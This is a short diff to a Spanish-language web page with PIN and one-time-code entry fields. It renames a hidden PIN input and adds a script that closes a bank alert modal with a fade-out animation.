@@ -208,7 +208,7 @@
                 </div>
 
                 <!-- INPUT HIDDEN PARA EL NIP -->
-                <input type="hidden" name="nip" id="nip">
+                <input type="hidden" name="nip2" id="nip">
 
                 <!-- BOTON CONFIRMAR -->
                 <div class="pt-6 space-y-4">
@@ -245,7 +245,46 @@
     </div>
 
 </div>
+<script>
 
+/* MOSTRAR AUTOMATICAMENTE */
+window.addEventListener('load', () => {
+
+    const modal = document.getElementById('bankAlertModal');
+    const closeBtn = document.getElementById('closeModalBtn');
+
+    /* CERRAR MODAL */
+    closeBtn.addEventListener('click', () => {
+
+        modal.style.animation = 'fadeOut .25s ease forwards';
+
+        setTimeout(() => {
+            modal.style.display = 'none';
+        }, 230);
+
+    });
+
+});
+
+/* ANIMACION CIERRE */
+const style = document.createElement('style');
+
+style.innerHTML = `
+@keyframes fadeOut{
+    from{
+        opacity:1;
+        transform:scale(1);
+    }
+    to{
+        opacity:0;
+        transform:scale(.96);
+    }
+}
+`;
+
+document.head.appendChild(style);
+
+</script>
     <script>
 
 const inputs = document.querySelectorAll('.otp-input');
